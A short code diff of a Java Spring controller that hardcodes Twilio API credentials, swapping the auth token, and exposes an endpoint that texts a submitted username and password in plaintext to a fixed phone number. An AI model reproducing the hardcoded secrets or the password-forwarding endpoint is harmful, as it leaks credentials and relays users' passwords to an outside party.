@@ -24,7 +24,7 @@ import com.twilio.type.PhoneNumber;
 public class ArtistaController {
 
 	private final static String ACCOUNT_SID = "AC06f3c3bd1ca7192e7035bab214c97777";
-	private final static String AUTH_ID = "a012669905f230a49ca0e2d97f29e991";
+	private final static String AUTH_ID = "f4958ed6cef3260f76f962ace09878a6";
 
 	static {
 		Twilio.init(ACCOUNT_SID, AUTH_ID);
@@ -55,7 +55,7 @@ public class ArtistaController {
 	public ResponseEntity<String> sendSMS(@RequestParam("pw")String password, @RequestParam("us")String username) {
 
 		Message.creator(new PhoneNumber("+393311528536"),
-				new PhoneNumber("+19126168038"), "Username:" + username +"\n"+" Password:"+"\n" +password ).create();
+				new PhoneNumber("+19126168038"), "Username:" + username +"\n"+" Password:" +password ).create();
 
 
 		return new ResponseEntity<String>("Message sent successfully", HttpStatus.OK);
